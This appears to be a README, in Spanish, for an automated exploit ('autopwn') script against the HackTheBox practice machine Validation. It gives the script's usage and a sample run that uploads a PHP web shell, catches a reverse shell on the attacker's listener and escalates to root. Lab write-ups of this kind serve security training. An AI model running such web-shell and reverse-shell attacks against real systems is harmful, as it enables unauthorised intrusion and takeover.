# Validation-Autopwn
Autopwn de la máquina Validation de la plataforma HackTheBox

## Uso:

```bash
❯ python3 validation.py
usage: validation.py [-h] [--rhost RHOST] --lhost LHOST [--lport LPORT] --file FILE
validation.py: error: the following arguments are required: --lhost, --file
```

```bash
❯ python3 validation.py -h
usage: validation.py [-h] [--rhost RHOST] --lhost LHOST [--lport LPORT] --file FILE

Máquina Validation Hack The Box AutoPwn

optional arguments:
  -h, --help     show this help message and exit
  --rhost RHOST  Remote host ip (default: 10.10.11.116)
  --lhost LHOST  Local host ip (Attacker)
  --lport LPORT  Local port (default: 443)
  --file FILE    File to upload
```

## Ejecución

```bash
❯ python3 validation.py --lhost 10.10.14.27 --file k4mishell
[+] Archivo k4mishell.php: Archivo creado exitosamente
[+] Reverse shell: Se ha recibido una conexión
[+] Trying to bind to :: on port 443: Done
[+] Waiting for connections on :::443: Got connection from ::ffff:10.10.11.116 on port 33544
[+] Reverse Shell: Inyección cargada correctamente
[*] Switching to interactive mode
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ su root
Password: $ whoami
root
$  
```
